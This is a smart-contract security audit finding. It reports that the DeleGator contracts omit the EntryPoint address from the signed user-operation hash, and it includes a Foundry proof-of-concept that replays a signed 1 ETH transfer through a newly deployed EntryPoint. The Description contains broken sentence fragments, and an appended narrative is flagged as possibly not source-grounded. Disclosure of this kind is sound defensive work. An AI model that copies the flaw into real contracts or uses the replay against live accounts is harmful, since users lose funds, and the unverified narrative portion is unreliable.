---
id: 2286
severity: "High"
---

# EntryPoint not included in user operation hash creates the possibility of Replay Attacks

## Description

** According to `EIP-4337`, the user operation hash should be constructed in a way to protect from replay attacks either on the same chain or different chains.

[eip-4337#useroperation](https://eips.ethereum.org/EIPS/eip-4337#useroperation)
This means that at worst you could directly use...
What the finding also implies, is that if...
The `userOpHash` is a hash over the userOp (except signature), entryPoint and chainId.

In the current `DeleGatorCore` and `EIP7702DeleGatorCore` implementations , the user operation hash does not include the `entryPoint` address.

```solidity
    function validateUserOp(
        PackedUserOperation calldata _userOp,
        bytes32, //@audit ignores UserOpHash from the Entry Point
        uint256 _missingAccountFunds
    ) ... {
        validationData_ = _validateUserOpSignature(_userOp, getPackedUserOperationTypedDataHash(_userOp));
        _payPrefund(_missingAccountFunds);
    }
// ------------------
    function getPackedUserOperationTypedDataHash(PackedUserOperation calldata _userOp) public view returns (bytes32) {
        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4(), getPackedUserOperationHash(_userOp));
    }
// ------------------
    function getPackedUserOperationHash(PackedUserOperation calldata _userOp) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                PACKED_USER_OP_TYPEHASH,
                _userOp.sender,
                _userOp.nonce,
                keccak256(_userOp.initCode),
                keccak256(_userOp.callData),
                _userOp.accountGasLimits,
                _userOp.preVerificationGas,
                _userOp.gasFees,
                keccak256(_userOp.paymasterAndData)
            )
        ); //@audit does not include entry point address
    }
```

Note above that the `EntryPoint` address is not included in the hash generated via `getPackedUserOperationHash()`. The `_domainSeparatorV4()` will only include the `chainId` and `address(this)` but excludes the `EntryPoint` address.

** Upgrading the delegator contract to include a new `EntryPoint` address opens the possibility of replay attacks.

## Proof of Concept

** Following POC shows the possibility of replaying previous native transfers when delegator contract is upgraded to a new `EntryPoint`.

```solidity
contract EIP7702EntryPointReplayAttackTest is BaseTest {
    using MessageHashUtils for bytes32;

    constructor() {
        IMPLEMENTATION = Implementation.EIP7702Stateless;
        SIGNATURE_TYPE = SignatureType.EOA;
    }

    // New EntryPoint to upgrade to
    EntryPoint newEntryPoint;
    // Implementation with the new EntryPoint
    EIP7702StatelessDeleGator newImpl;

    function setUp() public override {
        super.setUp();

        // Deploy a second EntryPoint
        newEntryPoint = new EntryPoint();
        vm.label(address(newEntryPoint), "New EntryPoint");

        // Deploy a new implementation connected to the new EntryPoint
        newImpl = new EIP7702StatelessDeleGator(delegationManager, newEntryPoint);
        vm.label(address(newImpl), "New EIP7702 StatelessDeleGator Impl");
    }

    function test_replayAttackAcrossEntryPoints() public {
        // 1. Create a UserOp that will be valid with the original EntryPoint
        address aliceDeleGatorAddr = address(users.alice.deleGator);

        // A simple operation to transfer ETH to Bob
        Execution memory execution = Execution({ target: users.bob.addr, value: 1 ether, callData: hex"" });

        // Create the UserOp with current EntryPoint
        bytes memory userOpCallData = abi.encodeWithSignature(EXECUTE_SINGULAR_SIGNATURE, execution);
        PackedUserOperation memory userOp = createUserOp(aliceDeleGatorAddr, userOpCallData);

        // Alice signs it with the current EntryPoint's context
        userOp.signature = signHash(users.alice, getPackedUserOperationTypedDataHash(userOp));

        // Bob's initial balance for verification
        uint256 bobInitialBalance = users.bob.addr.balance;

        // Execute the original UserOp through the first EntryPoint
        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
        userOps[0] = userOp;
        vm.prank(bundler);
        entryPoint.handleOps(userOps, bundler);

        // Verify first execution worked
        uint256 bobBalanceAfterExecution = users.bob.addr.balance;
        assertEq(bobBalanceAfterExecution, bobInitialBalance + 1 ether);

        // 2. Modify code storage
        // The code will be: 0xef0100 || address of new implementation
        vm.etch(aliceDeleGatorAddr, bytes.concat(hex"ef0100", abi.encodePacked(newImpl)));

        // Verify the implementation was updated
        assertEq(address(users.alice.deleGator.entryPoint()), address(newEntryPoint));

        // 3. Attempt to replay the original UserOp through the new EntryPoint
        vm.prank(bundler);
        newEntryPoint.handleOps(userOps, bundler);

        // 4. Verify if the attack succeeded - check if Bob received ETH again
        assertEq(users.bob.addr.balance, bobBalanceAfterExecution + 1 ether);

        console.log("Bob's initial balance was: %d", bobInitialBalance / 1 ether);
        console.log("Bob's balance after execution on old entry point was: %d", bobBalanceAfterExecution / 1 ether);
        console.log("Bob's balance after replaying user op on new entry point: %d", users.bob.addr.balance / 1 ether);
    }
}
```

## Recommendation

** Consider including `EntryPoint` address in the hashing logic of `getPackedUserOperationHash` of both `DeleGatorCore` and `EIP7702DeleGatorCore`

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a replay‑attack risk caused by the fact that the hash used to sign a UserOperation does not bind the operation to the EntryPoint contract that will execute it. According to EIP‑4337 the userOpHash must be computed over the user operation fields, the chain identifier and the address of the EntryPoint, so that a signature is only valid for that specific execution context. In the DeleGatorCore and EIP7702DeleGatorCore contracts the function getPackedUserOperationHash builds the hash from the sender, nonce, initCode, callData, gas limits, verification gas and paymaster data, but it deliberately omits the EntryPoint address. The domain separator that is later applied only includes the chainId and the address of the delegator contract, leaving the EntryPoint out of the signed message. Because of this omission the same signed UserOperation can be accepted by any EntryPoint on the same chain, and also by a different EntryPoint after the delegator contract is upgraded to point to a new EntryPoint. An attacker who observes a legitimate UserOperation – for example a transfer of 1 ether from Alice’s DeleGator to Bob – can replay the exact same signed data through a newly deployed EntryPoint after the delegator’s implementation is changed. The signature verification succeeds, the EntryPoint treats the operation as fresh, and the callData is executed again, resulting in a second transfer of the same funds. From the user’s perspective the expected outcome was a single transfer, but the recipient’s balance increases twice while the sender’s balance is reduced twice, effectively a double‑spend. The impact is loss of funds for the user and a breach of the protocol’s accounting guarantees; the protocol may appear to allow unlimited replay of old operations after upgrades. The issue appears only when the delegator contract is upgraded to reference a different EntryPoint or when multiple EntryPoints exist, and it is hard to notice because the hash calculation looks correct and the signature verification passes, giving a false sense of security. The problem was discovered during a security audit that included a proof‑of‑concept test replaying a previously executed UserOperation across two EntryPoints. To remediate the issue the hashing logic must be extended to include the EntryPoint address (or an equivalent unique identifier) in the typed data hash, ensuring that a signature is bound to the specific EntryPoint and preventing replay across different execution contexts. This class of bug is a missing‑context replay vulnerability, where a signed message does not incorporate all relevant environmental parameters, violating the intended non‑repudiation and uniqueness guarantees of the protocol.
